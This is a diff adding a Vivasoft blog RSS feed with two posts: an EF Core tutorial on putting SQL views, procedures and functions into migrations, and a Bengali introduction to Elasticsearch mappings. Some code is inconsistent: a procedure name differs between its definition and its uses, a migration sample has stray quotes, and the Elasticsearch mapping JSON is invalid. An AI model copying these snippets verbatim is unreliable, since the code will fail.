@@ -1,0 +1,2089 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Data &#8211; Vivasoft</title>
+	<atom:link href="/blog/category/data/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Top Software Company with Talented Geeks</description>
+	<lastBuildDate>Tue, 01 Nov 2022 05:24:11 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.1</generator>
+
+<image>
+	<url>/wp-content/uploads/2021/08/cropped-feb-icon-32x32.png</url>
+	<title>Data &#8211; Vivasoft</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Efficient way to handle Procedures, Views, Functions in EF Core</title>
+		<link>/blog/procedures-views-functions-in-entity-framework-core/</link>
+		
+		<dc:creator><![CDATA[Khairul Alam]]></dc:creator>
+		<pubDate>Mon, 31 Oct 2022 10:00:24 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Technology]]></category>
+		<category><![CDATA[entity framework]]></category>
+		<category><![CDATA[function]]></category>
+		<category><![CDATA[procedure]]></category>
+		<category><![CDATA[view]]></category>
+		<guid isPermaLink="false">/?p=12348</guid>
+
+					<description><![CDATA[Sometimes we need to write new Functions, Views and Procedures or use existing ones. In the past, EFCore hasn’t had a super nice way to handle non-table database structures. Therefore, in order to work with non-table database objects in EFCore5 code first implemented some new functionality around some of these items, including the ability to [&#8230;]]]></description>
+										<content:encoded><![CDATA[<div dir="ltr">Sometimes we need to write new Functions, Views and Procedures or use existing ones. In the past, EFCore hasn’t had a super nice way to handle non-table database structures. Therefore, in order to work with non-table database objects in EFCore5 code first implemented some new functionality around some of these items, including the ability to do a ToFunction or ToView call in the Fluent API to map queries to table-valued functions, procedures and views, which we can leverage in EFCore6.</div>
+<div dir="ltr"></div>
+<div dir="ltr">In this post, we will see how to add non-table database objects to db context  and put the SQL scripts into migration script in a nicer and cleaner way.</div>
+<div dir="ltr"></div>
+<div dir="ltr">
+<p>At first we will create one Procedure (spGetWeatherInformation), one View (vwLocationTemperatureSummery) and one Function (fnGetTemperatureByLocation) for example.  Then we will keep them in  three seperate directory in Sql Script directory of our WeatherForecast.Infrastructure project.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="sql">CREATE OR ALTER VIEW vwLocationTemperatureSummery
+AS
+SELECT 
+     Date,
+     Location,
+     TemperatureC Temperature,
+     Summary
+FROM WeatherForecasts</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="sql">CREATE OR ALTER PROCEDURE spGetWeatherForecast
+(
+   @location NVARCHAR(50)
+)
+AS
+BEGIN
+    SELECT 
+         Date,
+         Location,
+         TemperatureC Temperature,
+         Summary
+    FROM WeatherForecasts
+    WHERE LOWER(Location) = LOWER(@location)
+END</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="sql">CREATE OR ALTER FUNCTION fnGetTemperatureByLocation
+(
+   @location NVARCHAR(50)
+)
+RETURNS INT
+AS
+BEGIN
+
+    DECLARE @Temperature INT
+
+    SELECT TOP(1)
+    	@Temperature = TemperatureC
+    FROM WeatherForecasts
+    WHERE LOWER(Location) = LOWER(@location)
+    ORDER BY Id DESC
+
+    RETURN @Temperature
+
+END</pre>
+<p>&nbsp;</p>
+<p><img decoding="async" class="aligncenter size-full wp-image-12356" src="/wp-content/uploads/2022/10/script-directory-1.png" alt="script directory 1 Efficient way to handle Procedures, Views, Functions in EF Core" width="448" height="821" srcset="/wp-content/uploads/2022/10/script-directory-1.png 448w, /wp-content/uploads/2022/10/script-directory-1-164x300.png 164w" sizes="(max-width: 448px) 100vw, 448px"><br />
+Build Action of those file should be Embedded resource- Right click on the file then select Property—<br />
+<img decoding="async" class="aligncenter size-full wp-image-12357" src="/wp-content/uploads/2022/10/2-build-action.png" alt="2 build action Efficient way to handle Procedures, Views, Functions in EF Core" width="570" height="902" srcset="/wp-content/uploads/2022/10/2-build-action.png 570w, /wp-content/uploads/2022/10/2-build-action-480x760.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 570px, 100vw"></p>
+</div>
+<div dir="ltr"></div>
+<div dir="ltr">
+<div dir="ltr">
+<p>Now opening the Package Manager Console, will run following migration command—</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash">add-migration v1_3 -c ApplicationDbContext -o Migrations</pre>
+<p><img decoding="async" class="aligncenter size-full wp-image-12358" src="/wp-content/uploads/2022/10/3.-run-migration.png" alt="3. run migration Efficient way to handle Procedures, Views, Functions in EF Core" width="1885" height="946" srcset="/wp-content/uploads/2022/10/3.-run-migration.png 1885w, /wp-content/uploads/2022/10/3.-run-migration-1280x642.png 1280w, /wp-content/uploads/2022/10/3.-run-migration-980x492.png 980w, /wp-content/uploads/2022/10/3.-run-migration-480x241.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1885px, 100vw"></p>
+<p>we could have add the SQL Scripts like bellow in our migration to generate migration script</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="csharp">namespace WeatherForecast.Infrastucture.Migrations
+{
+    public partial class v1_3 : Migration
+    {
+        protected override void Up(MigrationBuilder migrationBuilder)
+        {
+            migrationBuilder.Sql(@"'CREATE OR ALTER VIEW vwLocationTemperatureSummery
+                                    AS
+                                    SELECT 
+    	                                Date,
+    	                                Location,
+    	                                TemperatureC Temperature,
+    	                                Summary
+                                    FROM WeatherForecasts'");
+        }
+
+        protected override void Down(MigrationBuilder migrationBuilder)
+        {
+            migrationBuilder.Sql(string.Format(@"DROP VIEW IF EXISTS {0}", "vwLocationTemperatureSummery"));
+        }
+    }
+}</pre>
+<p>But we will follow another approach so that we can create migration scripts dynamically from previously created scripts as well as those scripts can be tracked by the source control easily.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="csharp">namespace WeatherForecast.Infrastucture.Migrations
+{
+    public partial class v1_3 : Migration
+    {
+        protected override void Up(MigrationBuilder migrationBuilder)
+        {
+            migrationBuilder.RunSqlScript(View.LocationTemperatureSummery);
+            migrationBuilder.RunSqlScript(Procedure.GetWeatherInformation);       
+            migrationBuilder.RunSqlScript(Function.GetTemperatureByLocation);
+        }
+
+        protected override void Down(MigrationBuilder migrationBuilder)
+        {
+            migrationBuilder.Sql(string.Format(@"DROP VIEW IF EXISTS {0}", View.LocationTemperatureSummery));
+            migrationBuilder.Sql(string.Format(@"DROP PROCEDURE IF EXISTS {0}", Procedure.GetWeatherInformation));
+            migrationBuilder.Sql(string.Format(@"DROP FUNCTION IF EXISTS dbo.{0}", Function.GetTemperatureByLocation));
+        }
+    }
+}</pre>
+<p>Here RunSqlScript is an Extention funtion that takes the script name as parameter to generate the script—</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="csharp">namespace WeatherForecast.Infrastucture.Extensions
+{
+    public static class MigrationExtension
+    {
+        public static void RunSqlScript(this MigrationBuilder migrationBuilder, string script)
+        {
+            var assembly = Assembly.GetExecutingAssembly();
+            var resourceName = assembly.GetManifestResourceNames().FirstOrDefault(x =&gt; x.EndsWith($"{script}.sql"));
+            using var stream = assembly.GetManifestResourceStream(resourceName);
+            using var reader = new StreamReader(stream);
+            var sqlResult = reader.ReadToEnd();
+            migrationBuilder.Sql(sqlResult);
+        }
+    }
+}</pre>
+<p>Besides this, we will use constants to keep the name of View, Procedure and Function because this name needs to be used in many places.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="csharp">public class View
+{
+    /// &lt;summary&gt;
+    /// vwLocationTemperatureSummery
+    /// &lt;/summary&gt;
+    public const string LocationTemperatureSummery = "vwLocationTemperatureSummery";
+}
+
+public class Function
+{
+    /// &lt;summary&gt;
+    /// fnGetTemperatureByLocation(@location nvarchar) returns int
+    /// &lt;/summary&gt;
+    public const string GetTemperatureByLocation = "fnGetTemperatureByLocation";
+}
+
+public class Procedure
+{
+    /// &lt;summary&gt;
+    /// spGetWeatherInformation(@location nvarchar(50))
+    /// &lt;/summary&gt;
+    public const string GetWeatherInformation = "spGetWeatherInformation";
+}</pre>
+<p>Now to generate the migration script, run the following command—</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash">Script-Migration location-added v1_3 -c ApplicationDbContext -o Services/WeatherForecast/WeatherForecast.Infrastucture/Migrations/Scripts/v1.3.sql -i</pre>
+<p>-o = output location<br />
+-c = db-context<br />
+From location-added to v1_3<br />
+-i = Generate a script that can be used on a database at any migration</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="sql">BEGIN TRANSACTION;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+    CREATE OR ALTER VIEW vwLocationTemperatureSummery
+    AS
+    SELECT 
+    	Date,
+    	Location,
+    	TemperatureC Temperature,
+    	Summary
+    FROM WeatherForecasts
+
+END;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+    CREATE OR ALTER PROCEDURE spGetWeatherForecast(@location nvarchar(50))
+    AS
+    SELECT 
+    	Date,
+    	Location,
+    	TemperatureC Temperature,
+    	Summary
+    FROM WeatherForecasts
+    WHERE LOWER(Location) = LOWER(@location)
+END;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+
+    CREATE OR ALTER FUNCTION fnGetTemperatureByLocation
+    (
+
+    	@location NVARCHAR(50)
+    )
+    RETURNS int
+    AS
+    BEGIN
+
+    	DECLARE @Temperature int
+
+    	SELECT TOP(1)
+    		@Temperature = TemperatureC
+    	FROM WeatherForecasts
+    	WHERE LOWER(Location) = LOWER(@location)
+    	ORDER BY Id DESC
+
+    	RETURN @Temperature
+
+    END
+
+
+END;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+    INSERT INTO [__EFMigrationsHistory] ([MigrationId], [ProductVersion])
+    VALUES (N'20221031051328_v1_3', N'6.0.4');
+END;
+GO
+
+COMMIT;
+GO
+
+</pre>
+<p>But this script show some syntax error—<br />
+<img decoding="async" class="aligncenter size-full wp-image-12360" src="/wp-content/uploads/2022/10/4.-error-1-1.png" alt="4. error 1 1 Efficient way to handle Procedures, Views, Functions in EF Core" width="1922" height="818" srcset="/wp-content/uploads/2022/10/4.-error-1-1.png 1922w, /wp-content/uploads/2022/10/4.-error-1-1-1280x545.png 1280w, /wp-content/uploads/2022/10/4.-error-1-1-980x417.png 980w, /wp-content/uploads/2022/10/4.-error-1-1-480x204.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1922px, 100vw">So that we will add some modification maually and script sould be like folllowing—</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="sql">BEGIN TRANSACTION;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+EXEC(N'    CREATE OR ALTER VIEW vwLocationTemperatureSummery
+    AS
+    SELECT 
+    	Date,
+    	Location,
+    	TemperatureC Temperature,
+    	Summary
+    FROM WeatherForecasts')
+
+END;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+    EXEC(N'    CREATE OR ALTER PROCEDURE spGetWeatherForecast(@location nvarchar(50))
+        AS
+        SELECT 
+    		Date,
+    		Location,
+    		TemperatureC Temperature,
+    		Summary
+        FROM WeatherForecasts
+        WHERE LOWER(Location) = LOWER(@location)')
+END;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+
+   EXEC(N' CREATE OR ALTER FUNCTION fnGetTemperatureByLocation
+    (
+    	@location NVARCHAR(50)
+    )
+    RETURNS int
+    AS
+    BEGIN
+
+    	DECLARE @Temperature int
+
+    	SELECT TOP(1)
+    		@Temperature = TemperatureC
+    	FROM WeatherForecasts
+    	WHERE LOWER(Location) = LOWER(@location)
+    	ORDER BY Id DESC
+
+    	RETURN @Temperature
+
+    END')
+
+END;
+GO
+
+IF NOT EXISTS(SELECT * FROM [__EFMigrationsHistory] WHERE [MigrationId] = N'20221031051328_v1_3')
+BEGIN
+    INSERT INTO [__EFMigrationsHistory] ([MigrationId], [ProductVersion])
+    VALUES (N'20221031051328_v1_3', N'6.0.4');
+END;
+GO
+
+COMMIT;
+GO
+
+</pre>
+<p>Run the script and see the output—<br />
+<img decoding="async" class="aligncenter size-full wp-image-12362" src="/wp-content/uploads/2022/10/5.script-runngr-1-1.png" alt="5.script runngr 1 1 Efficient way to handle Procedures, Views, Functions in EF Core" width="1920" height="910" srcset="/wp-content/uploads/2022/10/5.script-runngr-1-1.png 1920w, /wp-content/uploads/2022/10/5.script-runngr-1-1-1280x607.png 1280w, /wp-content/uploads/2022/10/5.script-runngr-1-1-980x464.png 980w, /wp-content/uploads/2022/10/5.script-runngr-1-1-480x228.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1920px, 100vw"><br />
+Migration is done, Now we will create Dtos against our View, Procedure and Functions as well as map them in DbContext.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="csharp">public class ApplicationDbContext: DbContext, IApplicationDbContext
+{
+   public ApplicationDbContext()
+   {
+   }
+    #region TABLES
+    public DbSet&lt;WeatherForecastEntity&gt; WeatherForecasts =&gt; Set&lt;WeatherForecastEntity&gt;();
+    #endregion
+
+    #region VIEWS
+    /// &lt;summary&gt;
+    /// vwLocationTemperatureSummery
+    /// &lt;/summary&gt;
+    public DbSet&lt;LocationTemperatureSummeryDto&gt; LocationTemperatureSummery =&gt; Set&lt;LocationTemperatureSummeryDto&gt;();
+    #endregion
+
+    #region PROCEDURES
+    /// &lt;summary&gt;
+    /// spGetWeatherInformation(@location nvarchar(50)
+    /// &lt;/summary&gt;
+    public DbSet&lt;WeatherInformationDto&gt; GetWeatherInformation =&gt; Set&lt;WeatherInformationDto&gt;();
+    #endregion
+
+    #region FUNCTIONS
+    /// &lt;summary&gt;
+    /// fnGetTemperatureByLocation(@location nvarchar(50)
+    /// &lt;/summary&gt;
+    public DbSet&lt;TemperatureByLocationDto&gt; GetTemperatureByLocation =&gt; Set&lt;TemperatureByLocationDto&gt;();
+    #endregion
+
+    protected override void OnModelCreating(ModelBuilder builder)
+    {
+        builder.ApplyConfigurationsFromAssembly(Assembly.GetExecutingAssembly());
+        base.OnModelCreating(builder);
+
+        #region VIEWS
+        builder.Entity&lt;LocationTemperatureSummeryDto&gt;(x =&gt;
+        {
+            x.HasNoKey();
+            x.ToView(View.LocationTemperatureSummery);
+            x.Metadata.SetIsTableExcludedFromMigrations(true);
+        });
+        #endregion
+
+        #region FUNCTIONS
+        builder.Entity&lt;TemperatureByLocationDto&gt;(x =&gt;
+        {
+            x.HasNoKey();
+            x.ToFunction(Function.GetTemperatureByLocation);
+            x.Metadata.SetIsTableExcludedFromMigrations(true);
+        });
+        #endregion
+
+        #region PROCEDURES
+        builder.Entity&lt;WeatherInformationDto&gt;(x =&gt;
+        {
+            x.HasNoKey();
+            x.ToView(Procedure.GetWeatherInformation);
+            x.Metadata.SetIsTableExcludedFromMigrations(true);
+        });
+        #endregion
+    }
+}
+</pre>
+<p>all are done, now test with running following code—</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="csharp">var locationTemp = await _context
+    .LocationTemperatureSummery
+    .Where(x =&gt; x.Location == request.Location)
+    .ToListAsync();
+
+var location = new SqlParameter("location", System.Data.SqlDbType.NVarChar);
+location.Value = request.Location;
+
+// procedure 
+var weatherInfo = await _context
+    .GetWeatherInformation
+    .FromSqlRaw($"EXEC dbo.{Procedure.GetWeatherInformation} @location", location)
+    .ToListAsync();
+
+// function         
+var temp = (await _context
+.GetTemperatureByLocation
+.FromSqlRaw($"SELECT dbo.{Function.GetTemperatureByLocation}(@location) Temperature", location)
+.FirstOrDefaultAsync())!.Temperature;</pre>
+<p><img decoding="async" class="aligncenter size-full wp-image-12363" src="/wp-content/uploads/2022/10/final.png" alt="final Efficient way to handle Procedures, Views, Functions in EF Core" width="1914" height="918" srcset="/wp-content/uploads/2022/10/final.png 1914w, /wp-content/uploads/2022/10/final-1280x614.png 1280w, /wp-content/uploads/2022/10/final-980x470.png 980w, /wp-content/uploads/2022/10/final-480x230.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1914px, 100vw"></p>
+<p>Hope this will help to track non-table database objects by source controll and make easy to use of non-table database like View, Procedure and Function.</p>
+<p>Thanks with <a href="https://github.com/Khairultaher/SimpleCleanArchV2" rel="nofollow noopener" target="_blank">Source</a>.</p>
+</div>
+</div>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Elasticsearch কি এবং কেন?</title>
+		<link>/blog/elasticsearch/</link>
+		
+		<dc:creator><![CDATA[Jidul Islam]]></dc:creator>
+		<pubDate>Fri, 30 Sep 2022 10:06:37 +0000</pubDate>
+				<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Data]]></category>
+		<category><![CDATA[Technology]]></category>
+		<guid isPermaLink="false">/?p=12161</guid>
+
+					<description><![CDATA[আমরা যারা সফটওয়্যার ইঞ্জিনিয়ার বা যারা টেকনোলোজি নিয়ে কাজ করি বা যে যাই নিয়ে আছি না কেন, সবাই আমরা একটা কথায় একমত হব যে, প্রতিটা টেকনোলজি কোন না কোন নির্দিষ্ট সমস্যাকে সমাধান করতে এসেছে, সেইটা প্রোগ্রামিং লেঙ্গুয়েজে থেকে শুরু করে ডাটাবেস, ফ্রেমেওয়ার্ক কিংবা লাইব্রেরি (প্রোগ্রামিং ল্যাঙ্গুয়েজে এর) পর্যন্ত, তা না হলে টেকনোলজির এত বিস্তার কখনোই [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p><span style="font-weight: 400;">আমরা যারা সফটওয়্যার ইঞ্জিনিয়ার বা যারা টেকনোলোজি নিয়ে কাজ করি বা যে যাই নিয়ে আছি না কেন, সবাই আমরা একটা কথায় একমত হব যে, প্রতিটা টেকনোলজি কোন না কোন নির্দিষ্ট সমস্যাকে সমাধান করতে এসেছে, সেইটা প্রোগ্রামিং লেঙ্গুয়েজে থেকে শুরু করে ডাটাবেস, ফ্রেমেওয়ার্ক কিংবা লাইব্রেরি (প্রোগ্রামিং ল্যাঙ্গুয়েজে এর) পর্যন্ত, তা না হলে টেকনোলজির এত বিস্তার কখনোই হতো না।</span><span style="font-weight: 400;"> </span></p>
+<h2><b>Elasticsearch কি</b></h2>
+<p><span style="font-weight: 400;">এটি একটি NoSQL ডাটাবেস যেটা বিশেষ ভাবে distributed search  এবং aggregation ইঞ্জিন হিসাবে ব্যবহার এর জন্য বানানো হয়েছে। Elasticsearch এ স্ট্রাকচার্ড এবং আনস্ট্রাকচার্ড ডাটা ইন্সার্ট করা যায় এবং তার ভিত্তিতে রেজাল্ট পাওয়া যায়। আমরা সবাই NoSQL ডাটাবেস হিসাবে MongoDB এর কথা জানি কিন্তু MongoDB সাধারণ ভাবে (general purpose) NoSQL কে ব্যবহার করার জন্য বানানো হয়েছে। Elasticsearch এর রেজাল্ট কিন্তু </span><b>প্রায়</b><span style="font-weight: 400;"> রিয়েল টাইম।</span></p>
+<h2><b>কেন প্রয়োজন </b></h2>
+<p><span style="font-weight: 400;">আগে একটা কেইস বলি তারপর </span><b>কেন প্রয়োজন</b><span style="font-weight: 400;"> সেইটা নিয়ে বলবো, কথা দিলাম।  আমরা যখন একটা সফটওয়্যার বানায়, তখন আমাদের সফটওয়্যার খুব ভালো ভাবে চলে, আচরণ ও ভালো করে কিন্তু আস্তে আস্তে যখন সফটওয়্যার এর বয়স ও দায়িত্ব বাড়তে থাকে (ডাটা ভলিউম, read  এবং write concurrency) তখন আর আগের মতো ভালো আচরণ করে না, স্লো হয়ে যায়, ল্যাটেন্সি বেড়ে যায়। ফলাফলে end user নাখোশ। এইটা হয় </span><i><span style="font-weight: 400;">বেশিরভাগ সময় </span></i><span style="font-weight: 400;"> ঠিকঠাক ইনডেক্সিং না করা, রেপ্লিকেশনের অভাব, পচা কোয়েরি (N + ১) লেখা এবং সর্বোপরি না বুঝে ডাটাবেস সিলেক্ট করা </span><i><span style="font-weight: 400;">(কোথায় কত ইঞ্চির পেরেক মারা লাগবে তা জানা জরুরি)</span></i><span style="font-weight: 400;">। </span></p>
+<p><span style="font-weight: 400;">তারপর খুব সাধারণ ভাবে প্রায় সময় আমরা দোষ দেয় প্রোগ্রামিং ল্যাঙ্গুয়েজকে, ভাবি, ইশ একটা রকেট মার্কা ল্যাংগুজে দিয়ে লিখলে আজ এই দিন দেখা লাগতো না। </span><b>বেশির ভাগ সময় সময় সফটওয়্যার (ডাটা পারসিস্ট করে এমন) এর bottleneck থাকে হল ডাটাবেস</b><span style="font-weight: 400;"> </span></p>
+<p><span style="font-weight: 400;">এইবার আসি মূল গল্পে, </span><b>কেন প্রয়োজন</b><span style="font-weight: 400;">, </span></p>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">আপনি একটা ইকমার্স সফটওয়্যার বানাচ্ছেন যেইখানে হেভি সার্চ অপারেশন আছে, প্রোডাক্ট এর সংখ্যা ১০ লাখ বা তার ও বেশি। আপনাকে কিওয়ার্ড ধরে ধরে প্রথমে সাজেশন দেখতে হবে তারপর রেজাল্ট এবং ফিল্টার ও থাকতে পারে। রেস্পন্স টাইম থাকতে হবে ৩০০ মিলিসেকেন্ড এর কাছাকাছি। </span></li>
+<li><span style="font-weight: 400;">আপনি একটা রিয়েল এস্টেট সফটওয়্যার বানাচ্ছেন বাংলাদেশ এর জন্য যেইখানে geolocation এর উপর সার্চ হবে। ধরুন বনানী লিখে সার্চ দেয়ার পর বনানী এরিয়ার ভিতর এ যত বাসা ভাড়া দেয়া হবে তার একটা লিস্ট আসবে। মানে বনানীর পলিগন দিয়ে সার্চ। </span></li>
+<li><span style="font-weight: 400;">আপনার কাছে প্রচুর পরিমানে ডাটা আছে যেখানে ফুল টেক্সট সার্চ দরকার, উদহারণ হিসাবে ব্লগ টাইপের কনটেন্ট যেখানে সেন্টেন্স দিয়ে সার্চ করে কন্টেন্ট গুলা ফিল্টার করতে চাচ্ছেন</span></li>
+<li><span style="font-weight: 400;">আপনি দেশের জাতীয় ডাটাবেস থেকে একটা ডেমোগ্রাফিক aggregetion চাচ্ছেন, যেমন &#8211; বয়স, জেন্ডার, চাকরি, বেকার এর সংখ্যা ইত্যাদি এর রিপোর্ট। ডেটা ভলিউম বুজতেই পারছেন, প্রায় ১৮ কোটি এর উপর </span></li>
+</ul>
+<p><span style="font-weight: 400;">আমি শুধু কিছু আইডিয়া দেয়ার চেষ্টা করলাম কেইস গুলা বলে, এছাড়া আরো অনেক কিছু থাকতে পারে, এইটা আপনাদের বিবেচনা। </span></p>
+<h2><b>কিছু মৌলিক জ্ঞান</b><span style="font-weight: 400;"> </span></h2>
+<p><span style="font-weight: 400;">Elasticsearch এর কথা যখনি বলছি তখন অনেকে হয়তো SQL এর সাথে তুলুনা করতে পারেন। বুঝার সুবিধার্তে SQL এর সাথে তুলুনা করলে Elasticsearch এর কোনটাকে আমরা কি বলতে পারি এবং কি কি পার্থক্য আছে, সেইগুলা নিয়ে কথা হবে। </span></p>
+<p><span style="font-weight: 400;">চলুন শুরু করি &#8211; </span></p>
+<table>
+<tbody>
+<tr>
+<td>SQL</td>
+<td>Elasticsearch</td>
+<td>পার্থক্য</td>
+</tr>
+<tr>
+<td>column</td>
+<td>field</td>
+<td>SQL এ field এর যে data type দিব, আমাদেরকে সেইটাই ব্যবহার করতে হবে কিন্তু elasticsearch এ আমরা  একই datatype এর একাধিক (list) data রাখতে পারি</td>
+</tr>
+<tr>
+<td>row</td>
+<td>document</td>
+<td>SQL এর row বেশ কড়া (strict), schema তে যা আছে তাতেই ডাটা ঢুকাতে হবে, যতটা আছে, ঠিক ততটা কিন্তু elasticsearch এই দিক দিয়ে ফ্লেক্সিবল (যদিও তার schema আগে বলে দেয়া যায়), রানটাইমে column ও বাড়ানো যায়</td>
+</tr>
+<tr>
+<td>table</td>
+<td>index</td>
+<td>দুইটায় একই জিনিস, মানে যার উপর query হবে</td>
+</tr>
+<tr>
+<td>schema</td>
+<td>implicit</td>
+<td>SQL এ schema হল একটা boundary (দুস্টুমি চলবে না), elasticsearch schemaless হলেও predefined mapping করা যায় (বিস্তারিত পরে বলবো) যদিও পরবর্তীতে field এর সংখ্যা runtime এ বাড়ানো যায়</td>
+</tr>
+<tr>
+<td>database</td>
+<td>cluster</td>
+<td>SQL এ অনেক গুলা table একটা database এ encapsulate থাকে, elasticsearch এ database কন্সেপ্টটা নাই কিন্তু এইখানে indices গুলা একটা cluster এর মধ্যে থাকে। মানে, এইখানে SQL এর মতো আলাদা database তৈরি করা যায় না।</td>
+</tr>
+</tbody>
+</table>
+<h3><b>Mapping</b></h3>
+<p><span style="font-weight: 400;">Elasticsearch এ</span> <span style="font-weight: 400;">mapping</span> <span style="font-weight: 400;">হলো, index (table) এর মধ্যে field গুলাকে কিভাবে রাখা হবে / store হবে, কিভাবে index হবে তার একটা process. সহজ কথা হলো &#8211; একটা schema define করে দেয়া কোন field এর data type কেমন হবে এবং indexable হবে কিনা। যেমন &#8211; name, email, age, gender তিনটা ফিল্ড আছে</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">PUT /users
+
+{
+
+  "mappings": {
+
+    "properties": {
+
+      "name":   { "type": "text"  }
+
+      "email":  { "type": "keyword"  },  
+
+      "age":    { "type": "integer" }, 
+
+      "gender":    { "type": "keyword", "index": false, },     
+
+    }
+
+  }
+
+}</pre>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">তারপর যখন data ঢুকানো হবে তখন mapping অনুযায়ী data persist হবে। elasticsearch এ by default সব কিছু index থাকে, যদি কোন ফিল্ড এর index দরকার না হয় তখন mapping এর সময় index কে false করে দেয়া যায়। </span></p>
+<p><span style="font-weight: 400;">Mapping দুই ধরণের হতে পারে </span></p>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Dynamic mapping </span>
+<ul>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">যদি field এর নাম এবং data type যদি run time এ সেট হয়, predefined না থাকে তাহলে dynamic mapping ভালো একটা চয়েজ </span></li>
+</ul>
+</li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Explicit mapping </span>
+<ul>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">এই mapping টাতে অনেক বেশি কন্ট্রোল পাওয়া যায়, যেহেতু predefined থাকে field এর নাম এবং data type</span></li>
+</ul>
+</li>
+</ul>
+<h3><b>Field এর data type</b></h3>
+<p><span style="font-weight: 400;">কিছু কমন data type নিয়ে কথা বলবো, যেগুলা প্রায় সব সময় লাগে </span></p>
+<ul>
+<li><b>text</b><span style="font-weight: 400;"> &#8211; যখন একটা বড় content রাখতে হয় এবং পরে full text search করার প্রয়োজন হয়, তখন এটি ব্যবহার করা হয় সাধারণত</span></li>
+<li style="font-weight: 400;" aria-level="1"><b>keyword</b><span style="font-weight: 400;"> &#8211; exact match করবে এই ধরণের কেইস এ keyword ব্যবহার করা হয়</span></li>
+<li style="font-weight: 400;" aria-level="1"><b>numeric</b><span style="font-weight: 400;">  &#8211; এইখানে integer, long, short, double, float এবং আরো কিছু ধরণের value রাখা যায় </span></li>
+<li style="font-weight: 400;" aria-level="1"><b>date</b><span style="font-weight: 400;"> &#8211; এইখানে বিভিন্ন format এ date রাখা যায় &#8211; date, date-time, </span><span style="font-weight: 400;">milliseconds-since-the-epoch ইত্যাদি </span></li>
+<li style="font-weight: 400;" aria-level="1"><b>boolean</b><span style="font-weight: 400;"> &#8211; true, “true”, false, “false”</span></li>
+<li style="font-weight: 400;" aria-level="1"><b>object</b><span style="font-weight: 400;"> &#8211; field এ inner object হিসাবে data রাখার জন্য </span></li>
+<li style="font-weight: 400;" aria-level="1"><b>geo_point</b><span style="font-weight: 400;"> &#8211; এই field এ latitude এবং longitude রাখা যায়</span>
+<ul>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">একটা boundary এর ভিতরে geopoint খুঁজে পাওয়ার জন্য </span></li>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">central point থেকে নির্দিষ্ট দুরুত্বে (radius এ) অন্য coordinate গুলা খুঁজে বের করার জন্য </span></li>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">polygon দিয়ে search করার জন্য </span></li>
